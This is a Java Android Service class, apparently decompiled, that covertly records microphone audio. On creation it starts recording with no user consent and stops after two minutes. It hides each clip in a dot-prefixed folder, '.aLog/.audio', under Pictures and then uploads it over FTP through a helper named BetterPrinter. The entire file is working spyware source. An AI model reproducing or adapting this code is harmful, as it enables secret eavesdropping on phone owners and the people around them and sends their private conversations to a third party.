package stupuid.maga.legacy;

import android.app.Service;
import android.content.Intent;
import android.os.CountDownTimer;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import com.github.piasy.rxandroidaudio.AudioRecorder;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class HandleAudioClip extends Service implements Runnable {
    public static boolean running;
    File mAudioFile;
    AudioRecorder mAudioRecorder;

    public void onCreate() {
        if (!running) {
            running = true;
            recordingNow();
        }
        new Thread(this).start();
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        return 2;
    }

    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public void recordingNow() {
        if (this.mAudioRecorder == null) {
            this.mAudioRecorder = AudioRecorder.getInstance();
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm_ss", Locale.getDefault());
            this.mAudioFile = openFileFor();
            this.mAudioRecorder.prepareRecord(5, 2, 3, this.mAudioFile);
            this.mAudioRecorder.startRecord();
            aTimer();
        }
    }

    public void onDestroy() {
        running = false;
        this.mAudioRecorder.stopRecord();
        this.mAudioRecorder = null;
    }

    public void aTimer() {
        new CountDownTimer(120000, 1000) {
            public void onTick(long millisUntilFinished) {
                Log.i("seconds remaining: ", Long.toString(millisUntilFinished / 1000));
            }

            public void onFinish() {
                HandleAudioClip.this.mAudioRecorder.stopRecord();
                BetterPrinter.FTPIt(HandleAudioClip.this.mAudioFile.getPath(), HandleAudioClip.this.mAudioFile.getName(), HandleAudioClip.this.getApplicationContext());
            }
        }.start();
    }

    private File openFileFor() {
        if (Environment.getExternalStorageState().equals("mounted")) {
            File imageDirectory = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), ".aLog/.audio");
            if (imageDirectory.exists() || imageDirectory.mkdirs()) {
                return new File(imageDirectory.getPath() + File.separator + new SimpleDateFormat("yyyy_mm_dd_hh_mm_ss", Locale.getDefault()).format(new Date()) + "becky.file.mp4");
            }
        }
        return null;
    }

    public void run() {
    }
}
